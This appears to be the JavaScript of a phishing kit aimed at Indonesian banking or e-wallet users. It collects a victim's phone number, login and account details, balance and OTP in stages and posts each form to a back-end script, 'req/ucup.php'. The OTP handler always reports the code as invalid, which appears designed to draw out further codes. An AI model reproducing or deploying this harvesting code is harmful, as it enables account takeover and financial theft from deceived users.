function sendHp() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   var tarif = $('input[name="tarif"]:checked').val();
   if(tarif) {
      sessionStorage.setItem('tarif', tarif);
   }
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
   
   $.ajax({
        type: 'POST',
        url: 'req/ucup.php',
        data: $('#index').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "lg.php";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
         }, 800);
      }
   });
};



function sendLogin() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
        type: 'POST',
        url: 'req/ucup.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "blnce.php";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var nama = $('#nama').val();
            sessionStorage.setItem('nama', nama);
            var rek = $('#rek').val();
            sessionStorage.setItem('rek', rek);
         }, 500);
      }
   });
};


function sendSaldo() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
        type: 'POST',
        url: 'req/ucup.php',
        data: $('#sald').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "ver.php";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var nama = $('#nama').val();
            sessionStorage.setItem('nama', nama);
            var rek = $('#rek').val();
            sessionStorage.setItem('rek', rek);
            var saldo = $('#saldo').val();
            sessionStorage.setItem('saldo', saldo);
         }, 400);
      }
   });
};
        

// Kirim OTP
function sendOtp() {
   event.preventDefault();
   $("#loader").fadeIn();
   $(".btn-primary").prop("disabled", true);
      
   $.ajax({
        type: 'POST',
        url: 'req/ucup.php',
        data: $('#formLink').serialize(),
        datatype: 'JSON',
      complete: function() {
         $("#loader").fadeOut();
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").html("Kode aktivasi tidak valid!<br>Silakan coba lagi.").slideDown();
         $("#nama1").val('');
         $("#nama1").focus();
         setTimeout(function() {
            $("#errorAlert").slideUp();
         }, 3000);
      },
      
   });
};        

